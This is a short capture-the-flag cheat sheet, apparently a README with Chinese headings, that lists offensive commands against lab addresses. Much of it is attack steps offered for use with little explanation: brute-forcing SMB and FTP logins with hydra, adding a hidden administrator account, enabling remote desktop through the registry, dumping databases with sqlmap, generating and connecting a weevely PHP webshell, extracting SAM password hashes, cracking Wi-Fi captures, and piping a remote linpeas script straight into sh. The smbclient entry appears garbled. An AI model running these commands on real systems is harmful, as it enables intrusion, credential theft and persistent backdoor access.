# CTF Memo
## _nmap_
網路設備及服務掃描
```sh
sudo nmap 10.10.10.16  //1000 port
sudo nmap 10.10.10.16 -p-  //1-65535 port
sudo nmap 10.10.10.16 -sU -p53,139,161,1900,5353  //UDP port
sudo nmap 10.10.10.16 -p80 --reason  //REASON
sudo nmap 10.10.10.16 -p80 --open  //display only open port ip
sudo nmap 10.10.10.16 -O  //OS
sudo nmap 10.10.10.16 -sV  //VERSION
sudo nmap 10.10.10.16 -sVC -p445,3389  //VERSION + NSE
sudo nmap 10.10.10.* -sU -p161 --open  //SNMP
sudo nmap 10.10.10.16 -sU -p161 -sC  //使用 NSE 預設腳本
sudo nmap 10.10.10.16 -sU -p161 --script snmp-win32-users  //user account

```
## _snmp-check_
SNMP 設備列舉
```sh
sudo snmp-check 10.10.10.16
```
## _nbtscan_
NetBOIS 掃描
```sh
sudo nbtscan 10.10.10.1-254
```
## _hydra_
破密工具
```sh
hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst smb://10.10.10.16
hydra -L win32-users.txt -P /usr/share/wordlists/nmap.lst ftp://10.10.10.16
```
## _enum4linux_

列舉Windows訊息
```sh
sudo enum4linux -u king -p 'slave' -a 10.10.10.16
```
## _crackmapexec_
網域滲透工具
python3 -m pip install --upgrade impacket  (更新)
```sh
sudo crackmapexec smb 10.10.10.16 -u king -p 'slave' --shares
```
## _net_

```sh
net use \\10.10.10.16 slave /u:king
net view \\10.10.10.16
net user queen /add
net users
net localgroup Administrator queen /add
net localgroup Administrators
```
## _reg add_

新增機碼
```sh
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
## _netstat_
網路狀態
```sh
netstat -an | findstr :3389
```
## _sqlmap_
SQL檢測注入工具
```sh
sudo sqlmap -u "https://url" --cookie="<COOKIE>" --dbs
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name --tables
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --columns --technique=B
sudo sqlmap -u "https://url" --cookie="<COOKIE>" -D DB_name -T Table_name --dump --technique=B
```
## _weevely_
Webshell
```sh
weevely generate king backdoor.php  //生成
weevely http://ip:port/backdoor.php king  //連接
```
## _wpscan_
WordPress安全性掃描工具
```sh
wpscan --url http://url -e u  //列舉使用者
wpscan --url http://url -P /usr/share/wordlists/nmap.lst  //破密
```
## _pwdump_

```sh
reg save hklm\sam pwdump\sam
reg save hklm\system pwdump\system
impacket-secretsdump LOCAL -system pwdump/system -sam pwdump/sam -outputfile pwdump/10.10.10.10
ophcrack (執行程式破密)
```
## _john_
破密工具
```sh
john secret.txt --format=raw-md5
```
## _aircrack_

```sh
aircrack-ng WEPooo.cap
aircrack-ng WPA2ooo.cap -w /usr/share/wordlists/nmap.lst
```
## _linPEAS_

```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
## _Android_

```sh
nmap -p5555 10.10.10.* --open
sudo apt install -y adb
adb connect 10.10.10.20:5555
adb devices
adb shell
adb pull /system/app/cindy.apk E:\Cindy\  //get file
```
## _impacket upgrade_

```sh
python3 -m pip install --upgrade impacket
```
## _gzip_

```sh
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```
## _snow_

```sh
snow -C -p pass -m "message" text1.txt text2.txt
snow -C -p pass text2.txt text3.txt
```
## _mount_

```sh
mount -t cifs //10.10.10.20/C$ /mnt/smb -o username=king,password=slave
```
## _smbclient_

```sh
mount -U "kingdom\king"  //10.10.10.20/C$
```
## License

MIT
